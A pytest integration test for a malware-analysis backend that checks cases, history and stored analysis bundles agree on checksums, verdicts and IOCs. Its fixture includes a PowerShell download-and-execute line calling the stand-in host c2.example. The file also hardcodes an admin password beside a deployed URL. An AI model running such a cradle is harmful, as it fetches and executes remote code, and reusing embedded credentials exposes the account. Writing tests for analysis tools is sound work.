"""R28.2 · Restore Equivalence CI Gate — LIVE (production ingress).

Hits ``REACT_APP_BACKEND_URL`` with a real admin JWT so we exercise
the actual Motor async client + immutable SSOT store + all consumer
paths.  This is the authoritative gate — the in-process TestClient
variant only covers the sync Workspace ↔ SSOT path.

Assertion matrix
────────────────────────────────────────────────────────────
   Path                            identical:
   ──                              ───────────
   Workspace · GET /api/cases/{id}          ┐
   SSOT deref · GET /api/ssot/{inv_id}      ┼─►  checksum, verdict,
   History   · GET /api/history/{hid}       ┘    IOCs, version stamp,
                                                 artifact_trace

Run:  cd /app/backend && python -m pytest tests/test_restore_equivalence_live.py -v
"""
from __future__ import annotations

import hashlib
import json
import os
import sys
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, Optional

import pytest
import requests
from bson import ObjectId

sys.path.insert(0, "/app/backend")
# ── The live test targets the DEPLOYED backend which runs on
# ``DB_NAME=test_database`` (per /app/backend/.env).  The pytest
# conftest sets ``DB_NAME=nivxray_ci_local`` for in-process tests —
# override that here so our sync inserts land in the same Mongo DB
# that the live backend reads from.  Must run BEFORE deps imports.
os.environ["MONGO_URL"] = os.environ.get("LIVE_MONGO_URL", "mongodb://localhost:27017")
os.environ["DB_NAME"]   = os.environ.get("LIVE_DB_NAME",   "test_database")

BASE_URL = os.environ.get(
    "REACT_APP_BACKEND_URL",
    "https://greeting-app-5782.preview.emergentagent.com",
).rstrip("/")
ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"
TIMEOUT = 60


@pytest.fixture(scope="session")
def token() -> str:
    r = requests.post(
        f"{BASE_URL}/api/auth/login",
        json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
        timeout=TIMEOUT,
    )
    assert r.status_code == 200, r.text[:200]
    data = r.json()
    tok = data.get("access_token") or data.get("token")
    assert tok, f"no token: {data}"
    return tok


@pytest.fixture(scope="session")
def client(token) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "Authorization": f"Bearer {token}",
        "Content-Type":  "application/json",
    })
    return s


def _sample_ssot() -> Dict[str, Any]:
    return {
        "understanding": {"input_kind": "powershell", "confidence": 0.94},
        "analyst_narrative": {"executive_summary": "PS downloader"},
        "inline_story_preproc": {"stages": [{"op": "b64"}, {"op": "gzip"}]},
        "investigation_object": {"incident": {"behaviors": ["T1059.001"]}},
        "investigation_mode": True,
        "verdict_card": {"verdict": "Malicious", "confidence": 92,
                         "family": "Cobalt Strike"},
        "decode_trace": [
            {"op": "b64",  "out_len": 512,  "reason": "b64 alphabet"},
            {"op": "gzip", "out_len": 2048, "reason": "1F 8B magic"},
        ],
        "iedde": {"steps": [{"decision": "recover"}]},
        "canonical_confidence": 0.93,
        "canonical_confidence_reason": "3-layer clean recovery",
        "mitre": ["T1059.001", "T1105"],
        "lolbas": ["powershell.exe"],
        "semantic": {"clusters": ["c2-download"]},
        "reached_shellcode": True,
        "chain": [{"op": "b64"}, {"op": "gzip"}],
        "steps": [{"op": "b64", "args": {}}, {"op": "gzip", "args": {}}],
        "analysis": {"iocs": {"ipv4": ["1.2.3.4"],
                              "url":  ["http://c2.example/beacon"]},
                     "mitre": ["T1059.001"],
                     "ai_verdict": "Malicious"},
    }


def _fingerprint(ssot: Dict[str, Any]) -> str:
    strip = {"persisted_at", "last_seen_at", "ref_count", "ssot_source",
             "investigation_id", "checksum"}
    scrubbed = {k: v for k, v in ssot.items() if k not in strip}
    return hashlib.sha256(
        json.dumps(scrubbed, sort_keys=True, default=str,
                   ensure_ascii=False, separators=(",", ":")).encode("utf-8"),
    ).hexdigest()


def _iocs(ssot: Dict[str, Any]) -> Dict[str, Any]:
    return (ssot.get("analysis") or {}).get("iocs") or {}


def _verdict(ssot: Dict[str, Any]) -> Dict[str, Any]:
    return ssot.get("verdict_card") or {}


def _plant_history_row(input_text: str, ssot: Dict[str, Any]) -> str:
    """Directly insert a history row via sync PyMongo, and mint the
    matching ssot_ref via the immutable store.  Simulates a decode
    that landed a history row with a full SSOT bundle attached."""
    from deps import sync_collection
    from services.ssot_store import store_ssot, build_version_stamp

    _ssot = dict(ssot)
    _ssot["version"] = build_version_stamp()
    _ssot["persisted_at"] = datetime.now(timezone.utc).isoformat()
    ref = store_ssot(_ssot, user_email=ADMIN_EMAIL, case_name=None)

    now = datetime.now(timezone.utc)
    h = hashlib.sha256(input_text.encode("utf-8", errors="replace")).hexdigest()
    oid = ObjectId()
    doc = {
        "_id":         oid,
        "user_email":  ADMIN_EMAIL,
        "input_hash":  h,
        "input":       input_text,
        "input_preview": input_text[:500],
        "input_length": len(input_text),
        "output":      "iex ((New-Object Net.WebClient).DownloadString('http://c2.example/beacon'))",
        "chain":       ["b64", "gzip"],
        "trace":       [],
        "engine":      "powershell-recursive",
        "confidence":  92,
        "reached_shellcode": True,
        "iocs":        {"ipv4": ["1.2.3.4"], "url": ["http://c2.example/beacon"]},
        "mitre":       [{"id": "T1059.001", "name": "PowerShell"}],
        "verdict":     {"verdict": "Malicious"},
        "tags":        ["equivalence-live"],
        "notes":       "",
        "kind":        "single",
        "starred":     False,
        "run_count":   1,
        "first_seen":  now,
        "last_seen":   now,
        "ts":          now,
        "ssot_ref":    ref,
    }
    sync_collection("investigations").insert_one(doc)
    return str(oid)


def _save_case_with_ssot(client: requests.Session, name: str,
                         input_text: str, ssot: Dict[str, Any]) -> Dict[str, Any]:
    r = client.post(
        f"{BASE_URL}/api/cases/save",
        json={
            "name": name,
            "input": input_text,
            "output": "iex ((New-Object Net.WebClient).DownloadString('http://c2.example/beacon'))",
            "engine": "powershell-recursive",
            "confidence": 92,
            "chain_ids": ["b64", "gzip"],
            "verdict": "Malicious",
            "iocs": {"ipv4": ["1.2.3.4"]},
            "ssot": ssot,
        },
        timeout=TIMEOUT,
    )
    assert r.status_code == 200, r.text[:300]
    return r.json()


# ═════════════════════════════════════════════════════════════════════════
def test_workspace_case_matches_ssot_dereference(client):
    ssot = _sample_ssot()
    name = f"restore-eq-live-case-{uuid.uuid4().hex[:6]}"
    _save_case_with_ssot(client, name, f"psl-{uuid.uuid4().hex}", ssot)

    cases = client.get(f"{BASE_URL}/api/cases", params={"limit": 200}, timeout=TIMEOUT).json()["cases"]
    case_id = [c for c in cases if c["name"] == name][0]["id"]
    ws = client.get(f"{BASE_URL}/api/cases/{case_id}", timeout=TIMEOUT).json()

    ref = ws.get("ssot_ref") or {}
    assert ref.get("id"), "workspace restore must expose ssot_ref"
    deref = client.get(f"{BASE_URL}/api/ssot/{ref['id']}", timeout=TIMEOUT).json()

    assert _fingerprint(ws["ssot"]) == _fingerprint(deref["ssot"])
    assert ref["checksum"] == deref["checksum"]
    assert _verdict(ws["ssot"]) == _verdict(deref["ssot"])
    assert _iocs(ws["ssot"]) == _iocs(deref["ssot"])
    assert ws["ssot"]["version"] == deref["version"]
    assert ws["artifact_trace"] == deref["artifact_trace"]


def test_history_restore_matches_ssot_dereference(client):
    ssot = _sample_ssot()
    input_text = f"psl-history-{uuid.uuid4().hex[:6]}"
    hid = _plant_history_row(input_text, ssot)
    r = client.get(f"{BASE_URL}/api/history/{hid}", timeout=TIMEOUT)
    assert r.status_code == 200, f"history GET {hid} → {r.status_code}: {r.text[:300]}"
    row = r.json()

    ref = row.get("ssot_ref") or {}
    assert ref.get("id"), f"history row must carry ssot_ref; got keys={list(row.keys())}"
    assert row.get("ssot"), "history row must resolve to an SSOT"

    deref = client.get(f"{BASE_URL}/api/ssot/{ref['id']}", timeout=TIMEOUT).json()
    assert _fingerprint(row["ssot"]) == _fingerprint(deref["ssot"])
    assert ref["checksum"] == deref["checksum"]
    assert row.get("artifact_trace") == deref["artifact_trace"]


def test_workspace_and_history_share_one_immutable_investigation(client):
    """R28.2 core invariant: same SSOT bundle produces same checksum
    across consumers → they reference ONE immutable investigation."""
    ssot = _sample_ssot()
    input_text = f"psl-shared-{uuid.uuid4().hex[:6]}"
    hid = _plant_history_row(input_text, ssot)
    name = f"restore-eq-live-shared-{uuid.uuid4().hex[:6]}"
    _save_case_with_ssot(client, name, input_text, ssot)

    cases = client.get(f"{BASE_URL}/api/cases", params={"limit": 200}, timeout=TIMEOUT).json()["cases"]
    case_id = [c for c in cases if c["name"] == name][0]["id"]
    case = client.get(f"{BASE_URL}/api/cases/{case_id}", timeout=TIMEOUT).json()
    row  = client.get(f"{BASE_URL}/api/history/{hid}",   timeout=TIMEOUT).json()

    case_ref = case.get("ssot_ref") or {}
    hist_ref = row.get("ssot_ref") or {}
    assert case_ref.get("id"), f"case missing ssot_ref: {list(case.keys())}"
    assert hist_ref.get("id"), f"history missing ssot_ref: {list(row.keys())}"
    assert case_ref["checksum"] == hist_ref["checksum"], \
        "identical SSOT bundles MUST produce identical checksums across consumers"
    assert case_ref["id"] == hist_ref["id"], \
        "identical SSOT bundles MUST collapse to ONE investigation_id (dedupe)"


def test_ssot_dereference_is_authoritative(client):
    """GET /api/ssot/{id} is the single source of truth for every consumer."""
    ssot = _sample_ssot()
    input_text = f"psl-auth-{uuid.uuid4().hex[:6]}"
    hid = _plant_history_row(input_text, ssot)
    name = f"restore-eq-live-auth-{uuid.uuid4().hex[:6]}"
    _save_case_with_ssot(client, name, input_text, ssot)

    cases = client.get(f"{BASE_URL}/api/cases", params={"limit": 200}, timeout=TIMEOUT).json()["cases"]
    case_id = [c for c in cases if c["name"] == name][0]["id"]
    case = client.get(f"{BASE_URL}/api/cases/{case_id}", timeout=TIMEOUT).json()
    row  = client.get(f"{BASE_URL}/api/history/{hid}",   timeout=TIMEOUT).json()

    inv_id = (case.get("ssot_ref") or {}).get("id")
    canonical = client.get(f"{BASE_URL}/api/ssot/{inv_id}", timeout=TIMEOUT).json()

    fp = _fingerprint(canonical["ssot"])
    assert _fingerprint(case["ssot"]) == fp
    assert _fingerprint(row["ssot"])  == fp
    assert _verdict(case["ssot"]) == _verdict(canonical["ssot"])
    assert _verdict(row["ssot"])  == _verdict(canonical["ssot"])
    assert _iocs(case["ssot"])    == _iocs(canonical["ssot"])
    assert _iocs(row["ssot"])     == _iocs(canonical["ssot"])
    assert case["artifact_trace"] == canonical["artifact_trace"] == row["artifact_trace"]
